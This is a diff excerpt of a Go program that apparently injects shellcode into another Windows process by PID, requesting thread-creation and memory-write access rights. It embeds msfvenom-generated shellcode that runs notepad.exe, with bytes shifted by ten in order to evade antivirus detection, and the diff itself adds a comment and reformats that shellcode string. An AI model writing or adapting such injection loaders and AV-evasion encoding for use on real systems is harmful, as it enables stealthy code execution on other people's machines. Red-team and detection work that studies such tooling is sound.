@@ -31,12 +31,12 @@ import (
 )
 
 func main() {
-
 	if len(os.Args) != 2 {
 		fmt.Fprintf(os.Stderr, "%s <pid>", os.Args[0])
 		os.Exit(1)
 	}
 
+	// OpenProcess request access rights
 	const requestRights = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
 		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
 		windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
@@ -58,7 +58,8 @@ func main() {
 		// msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f c
 		// Payload size: 279 bytes
 		// Shifted 10 bytes right to prevent AV detection of shellcode.
-		shellcodeData = []byte("\x06\x52\x8d\xee\xfa\xf2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x5c\x5b\x60\x52\x3b\xdc" +
+		shellcodeData = []byte("" +
+			"\x06\x52\x8d\xee\xfa\xf2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x5c\x5b\x60\x52\x3b\xdc" +
 			"\x6f\x52\x95\x5c\x6a\x52\x95\x5c\x22\x52\x95\x5c\x2a\x52\x95\x7c\x5a\x52\x19\xc1" +
 			"\x54\x54\x57\x3b\xd3\x52\x3b\xca\xb6\x46\x6b\x86\x0c\x36\x2a\x4b\xcb\xd3\x17\x4b" +
 			"\x0b\xcb\xec\xf7\x5c\x4b\x5b\x52\x95\x5c\x2a\x95\x4c\x46\x52\x0b\xda\x95\x8a\x92" +
